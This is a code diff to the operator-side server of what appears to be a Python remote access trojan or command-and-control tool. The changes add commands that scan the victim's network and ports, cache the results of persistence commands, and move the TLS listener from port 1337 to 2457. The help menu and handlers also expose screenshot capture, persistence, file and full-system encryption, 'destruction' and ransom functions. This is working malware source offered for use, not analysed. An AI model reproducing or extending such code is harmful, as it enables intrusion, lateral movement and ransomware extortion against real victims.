@@ -102,6 +102,12 @@ def help_option():
                     ---------------------------------------------------------
                     | [!>] screenshot      -> Take a screenshot
                     ---------------------------------------------------------
+                    | [!>] scannet         -> Scan all active hosts on target
+                    ---------------------------------------------------------
+                    | [!>] scanhost <host> -> Scan ports on host
+                    ---------------------------------------------------------
+                    | [!>] hosts           -> See hosts scanned with scannet
+                    ---------------------------------------------------------
                     | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                     ---------------------------------------------------------
                     | [!>] destruction     -> (N/A) Eliminate all and close conect
@@ -387,23 +393,35 @@ def getFileURL(command, targetConn):
         print("ERROR: " + resp.decode(errors="ignore", encoding="utf-8"))
 
 
-def tryPersistence(targetConn):
+def tryPersistence(targetConn, cachedCommands):
+    if cachedCommands['commands']['persistence']:
+        print(f"{Y}Cached Command: {END}\n\t{cachedCommands['commands']['persistence']}")
+        return
+
     persistenceCoded = "cGVyc2lzdGVuY2UK"
     targetConn.send(persistenceCoded.encode())
     res = targetConn.recv(1024)
+
     if res == "no_root".encode():
+        cachedCommands['commands']['persistence'] = f"\n\t{Y}[!>]{R} No Suficient Privileges...\n"
         print(f"\n\t{Y}[!>]{R} No Suficient Privileges...\n")
     elif res == "root":
+        cachedCommands['commands']['persistence'] = f"\n\t{Y}[!>]{B} Persistence successfully added...\n"
         print(f"\n\t{Y}[!>]{B} Persistence successfully added...\n")
     else:
         print(f"\n\t{R}[!>]{Y} Error trying persistence...\n")
 
 
-def lowPersistence(targetConn):
+def lowPersistence(targetConn, cachedCommands):
+    if cachedCommands['commands']['lowpersistence']:
+        print(f"{Y}Cached Command: {END}\n\t{cachedCommands['commands']['lowpersistence']}")
+        return
+
     persistenceCoded = "bG93cGVyc2lzdGVuY2UK"
     targetConn.send(persistenceCoded.encode())
     res = targetConn.recv(1024)
     if res == "done".encode():
+        cachedCommands['commands']['lowpersistence'] = f"\n\t{Y}[!>]{B} Low Persistence successfully added...\n"
         print(f"\n\t{Y}[!>]{B} Low Persistence successfully added...\n")
     else:
         print(f"\n\t{R}[!>]{Y} Error trying persistence...\n")
@@ -521,6 +539,41 @@ def cryptFile(targetConn, command):
             f" File Crypted Unsuccsefully \n\t{result}\n" + Fore.RESET)
 
 
+def scannet(targetConn, command, cachedCommands):
+    cachedCommands['commands'][command] = []
+    print(f"{B}[*>] {END} Scanning Net, this may take a while")
+    codedCommand = command.replace("scannet", "çc2Nhbm5ldAo=")
+    targetConn.send(codedCommand.encode())
+    nhosts = int(targetConn.recv(1024).decode())
+    ndo = 1
+    while ndo <= nhosts:
+        hst = targetConn.recv(1024).decode()
+        cachedCommands['commands'][command].append(hst)
+        print(f"\t{Y}[*>]{END} HOST: {hst}\n")
+        ndo += 1
+
+
+def scanhost(targetConn, command, cachedCommands):
+    if command in cachedCommands['commands']:
+        print("\n{}Cached Command: {}HOST: {}\n\t\tPORTS: {}".format(Y, END, command.replace("scanhost", ""), cachedCommands['commands'][command]))
+
+    else:
+        coded = command.replace("scanhost", "c2Nhbmhvc3QK")
+        targetConn.send(coded.encode())
+        print(f"{B}[*>] {END}Wait For The results {command.replace('scanhost ', '')}...\n\t")
+        while True:
+            data = targetConn.recv(4096).decode()
+            if "Scaning" in data:
+                print(data, end="\r")
+            elif "Error" in data:
+                print("\n", data)
+                break
+            else:
+                print(f"\n\n\t[>] Open Ports: {data}\n")
+                cachedCommands['commands'][command] = data
+                break
+
+
 def mainFunctions(ip, targetConn, ses):
     if not os.path.exists(f"./DATA/{ip[0]}"):
         os.makedirs(f"./DATA/{ip[0]}")
@@ -568,10 +621,10 @@ def mainFunctions(ip, targetConn, ses):
                 getFileURL(command, targetConn)
 
             elif command.startswith("persistence"):
-                tryPersistence(targetConn)
+                tryPersistence(targetConn, cachedCommands)
 
             elif command.startswith("lowpersistence"):
-                lowPersistence(targetConn)
+                lowPersistence(targetConn, cachedCommands)
 
             elif command[:8] == "cryptDir":
                 cryptDir(targetConn, command)
@@ -588,6 +641,18 @@ def mainFunctions(ip, targetConn, ses):
             elif command.startswith("screenshot"):
                 reciveScreenshot(targetConn, ip)
 
+            elif command.startswith("scannet"):
+                global hosts
+                scannet(targetConn, command, cachedCommands)
+
+            elif command == "hosts":
+                try:
+                    print("\n\t", cachedCommands['commands']["scannet"], "\n")
+                except NameError:
+                    print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
+
+            elif command.startswith("scanhost"):
+                scanhost(targetConn, command, cachedCommands)
 
             elif command.startswith("ransom"):
                 startRansom()
@@ -648,7 +713,7 @@ if __name__ == "__main__":
     print(f"{Y}[!>] {R}Waiting For incoming Conections...{END}")
     serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     serverSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    serverSock.bind(('0.0.0.0', 1337))
+    serverSock.bind(('0.0.0.0', 2457))
     serverSock.listen(5)
     serverSock = context.wrap_socket(serverSock)
     server(serverSock)
